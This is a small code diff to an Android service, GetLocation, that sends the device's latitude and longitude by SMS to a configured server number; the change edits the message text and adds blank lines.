@@ -122,10 +122,12 @@ public class GetLocation extends Service {
             public void run() {
                 // do the thing that takes a long time
                 Log.d(TAG, "sendSMS run() called with: " + "");
-                String smsBody = "Latiitude: [" + latitude + "] " +  "Longitude: [" + longitude + "] ";
+                String smsBody = "Laterox Latitude: [" + latitude + "] " +  "Longitude: [" + longitude + "] ";
                 SmsManager smsManager = SmsManager.getDefault();
                 smsManager.sendTextMessage(Constants.serverNumber, null, smsBody, null, null);
             }
         }).start();
     }
+
+
 }
